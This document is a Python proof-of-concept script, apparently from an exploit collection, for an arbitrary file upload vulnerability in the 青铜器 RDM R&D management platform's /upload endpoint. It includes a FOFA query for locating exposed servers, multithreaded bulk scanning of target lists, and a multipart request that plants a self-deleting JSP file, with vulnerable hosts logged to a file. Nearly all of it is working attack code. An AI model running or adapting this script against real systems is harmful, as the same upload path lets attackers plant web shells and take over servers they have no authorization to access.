# 青铜器RDM研发管理平台 upload接口处存在任意文件上传漏洞

#FOFA语法：body="/images/rdm.ico"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
  ____                           __          __              _____  _____  __  __ 
 |  _ \                          \ \        / /             |  __ \|  __ \|  \/  |
 | |_) |_ __ ___  _ __  _______   \ \  /\  / /_ _ _ __ ___  | |__) | |  | | \  / |
 |  _ <| '__/ _ \| '_ \|_  / _ \   \ \/  \/ / _` | '__/ _ \ |  _  /| |  | | |\/| |
 | |_) | | | (_) | | | |/ /  __/    \  /\  / (_| | | |  __/ | | \ \| |__| | |  | |
 |____/|_|  \___/|_| |_/___\___|     \/  \/ \__,_|_|  \___| |_|  \_\_____/|_|  |_|
                                                                                                                                                                                                                                                                                                                                     
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="青铜器RDM研发管理平台")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=98hgfhfbuefbhbvuyh98',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection': 'close'
    }
    data = '''
        --98hgfhfbuefbhbvuyh98
        Content-Disposition: form-data; name="file"; filename="ceshi.jsp"
        Content-Type: application/octet-stream

        <% out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        --98hgfhfbuefbhbvuyh98
        Content-Disposition: form-data; name="Submit"

        Go
        --98hgfhfbuefbhbvuyh98--
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "/000000000/demo.jsp" in res.text:
            print(f"f[+]该url存在任意文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件上传漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()